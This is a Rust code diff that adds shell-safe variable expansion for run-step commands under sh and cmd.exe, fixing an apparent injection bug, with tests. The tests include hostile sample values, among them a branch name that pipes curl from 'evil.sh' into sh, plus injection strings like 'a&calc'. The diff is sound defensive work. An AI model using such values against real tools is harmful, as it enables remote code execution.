@@ -486,8 +486,73 @@ impl RunVars {
 }
 
 /// Replaces `$NAME` and `${NAME}` for the names in `vars`; anything else (other variables, a lone `$`) is left for
-/// the shell, so the same text works under cmd.exe and sh.
+/// the shell, so the same text works under cmd.exe and sh. The values go in as they are: use it for text no shell
+/// parses (`env`), and [`expand_command`] for a command line.
 pub fn expand(text: &str, vars: &[(&str, String)]) -> String {
+    substitute(text, vars, |_, v| Ok::<_, std::convert::Infallible>(v.to_string())).unwrap_or_else(|e| match e {})
+}
+
+/// The shell a run step's command line goes through.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum CommandShell {
+    /// `/bin/sh -c` (macOS, Linux).
+    Sh,
+    /// A `.cmd` script (Windows).
+    Cmd,
+}
+
+/// A variable whose value cmd.exe would parse as part of the command (PDT-411).
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct UnsafeValue {
+    pub name: String,
+    pub value: String,
+}
+
+impl std::fmt::Display for UnsafeValue {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        write!(
+            f,
+            "${} is `{}`, which has characters cmd.exe would run as part of the command \
+             (& | < > ^ % ! \" or a line break), so PDT doesn't put it in the command line",
+            self.name, self.value
+        )
+    }
+}
+
+/// Whether `value` reads the same pasted anywhere in a command line, quoted or not, under sh and cmd.exe: letters,
+/// digits and `_ - . / \ : @ + = , ( )`. Branch names and paths with anything else (`$( )`, `;`, quotes, a space)
+/// could end the word they're in or run code.
+fn plain(value: &str) -> bool {
+    value.chars().all(|c| c.is_alphanumeric() || "_-./\\:@+=,()".contains(c))
+}
+
+/// The characters cmd.exe acts on in a `call` line even after percent expansion.
+fn cmd_special(c: char) -> bool {
+    "&|<>^%!\"".contains(c) || c.is_control()
+}
+
+/// [`expand`] for a command line run through `shell`, which must never run a value as code (a branch named
+/// `x$(curl …|sh)`, PDT-411). A plain value is pasted as before. Otherwise, under sh, the reference becomes `${NAME}`
+/// for the shell to read from the run's environment (where [`run_env`] puts every variable), so it stays one value
+/// however the command quotes it. cmd.exe has no such safe form (`%NAME%` is parsed after it is filled in), so a value
+/// with a character it acts on is refused; spaces and parentheses go in as they are, as before.
+pub fn expand_command(text: &str, vars: &[(&str, String)], shell: CommandShell) -> Result<String, UnsafeValue> {
+    substitute(text, vars, |name, value| match shell {
+        _ if plain(value) => Ok(value.to_string()),
+        CommandShell::Sh => Ok(format!("${{{name}}}")),
+        CommandShell::Cmd if value.chars().any(cmd_special) => {
+            Err(UnsafeValue { name: name.to_string(), value: value.to_string() })
+        }
+        CommandShell::Cmd => Ok(value.to_string()),
+    })
+}
+
+/// Finds each `$NAME` / `${NAME}` naming one of `vars` and puts in what `with(name, value)` gives.
+fn substitute<E>(
+    text: &str,
+    vars: &[(&str, String)],
+    mut with: impl FnMut(&str, &str) -> Result<String, E>,
+) -> Result<String, E> {
     let lookup = |n: &str| vars.iter().find(|(k, _)| *k == n).map(|(_, v)| v.as_str());
     let mut out = String::with_capacity(text.len());
     let mut rest = text;
@@ -505,7 +570,7 @@ pub fn expand(text: &str, vars: &[(&str, String)]) -> String {
         };
         match lookup(name).filter(|_| !name.is_empty()) {
             Some(v) => {
-                out.push_str(v);
+                out.push_str(&with(name, v)?);
                 rest = &after[consumed..];
             }
             None => {
@@ -515,7 +580,7 @@ pub fn expand(text: &str, vars: &[(&str, String)]) -> String {
         }
     }
     out.push_str(rest);
-    out
+    Ok(out)
 }
 
 /// The variables a run's processes get: PDT's own, then the definition's `env` (expanded), which wins.
@@ -817,6 +882,59 @@ command = "cargo run"
         assert_eq!(expand("$PDT_OWNER_LOGIN/$PDT_RUN_BRANCH", &p), "me@example.com/feature/x");
         assert_eq!(expand("${PDT_RUN_DATA}/db", &p), "/data/runs/p/main/web/db");
         assert_eq!(expand("${NOPE", &p), "${NOPE");
+    }
+
+    #[test]
+    fn command_expansion_never_pastes_shell_syntax() {
+        let mut v = vars();
+        v.branch = "x$(curl${IFS}evil.sh|sh)".into();
+        v.data_dir = Some("/Users/A B/data".into());
+        let p = v.pairs();
+        // Plain values go in as before, under either shell.
+        for shell in [CommandShell::Sh, CommandShell::Cmd] {
+            assert_eq!(
+                expand_command("serve --port $PORT --host ${PDT_RUN_HOST}", &p, shell).unwrap(),
+                "serve --port 8401 --host box.t.ts.net"
+            );
+            assert_eq!(expand_command("echo $HOME $$", &p, shell).unwrap(), "echo $HOME $$");
+        }
+        // Anything else is left for sh to read from the environment.
+        assert_eq!(
+            expand_command("echo $PDT_RUN_BRANCH \"$PDT_RUN_DATA/db\" $PORT", &p, CommandShell::Sh).unwrap(),
+            "echo ${PDT_RUN_BRANCH} \"${PDT_RUN_DATA}/db\" 8401"
+        );
+        // cmd.exe: a space goes in as it always did; a character cmd acts on is refused.
+        assert_eq!(expand_command("dir \"$PDT_RUN_DATA\"", &p, CommandShell::Cmd).unwrap(), "dir \"/Users/A B/data\"");
+        let e = expand_command("echo $PDT_RUN_BRANCH", &p, CommandShell::Cmd).unwrap_err();
+        assert_eq!(e.name, "PDT_RUN_BRANCH");
+        assert!(e.to_string().contains("$PDT_RUN_BRANCH is `x$(curl${IFS}evil.sh|sh)`"), "{e}");
+        for bad in ["a&calc", "a%PATH%", "a\"b", "a!b", "a^b", "a>b"] {
+            v.branch = bad.into();
+            assert!(expand_command("x $PDT_RUN_BRANCH", &v.pairs(), CommandShell::Cmd).is_err(), "{bad}");
+        }
+        // Not referenced, not checked.
+        assert_eq!(expand_command("echo hi", &v.pairs(), CommandShell::Cmd).unwrap(), "echo hi");
+    }
+
+    #[test]
+    fn command_expansion_under_sh_runs_nothing_from_a_value() {
+        if cfg!(windows) {
+            return;
+        }
+        let dir = std::env::temp_dir().join(format!("pdt-expand-{}", std::process::id()));
+        std::fs::create_dir_all(&dir).unwrap();
+        let marker = dir.join("pwned");
+        let mut v = vars();
+        v.branch = format!("x$(touch {})`touch {}`;touch {}", marker.display(), marker.display(), marker.display());
+        let p = v.pairs();
+        let cmd = expand_command("echo $PDT_RUN_BRANCH \"${PDT_RUN_BRANCH}\"", &p, CommandShell::Sh).unwrap();
+        let out =
+            std::process::Command::new("/bin/sh").args(["-c", &cmd]).env("PDT_RUN_BRANCH", &v.branch).output().unwrap();
+        let exists = marker.exists();
+        let _ = std::fs::remove_file(&marker);
+        let _ = std::fs::remove_dir(&dir);
+        assert!(!exists, "a value ran as code");
+        assert_eq!(String::from_utf8_lossy(&out.stdout).trim(), format!("{} {}", v.branch, v.branch));
     }
 
     #[test]
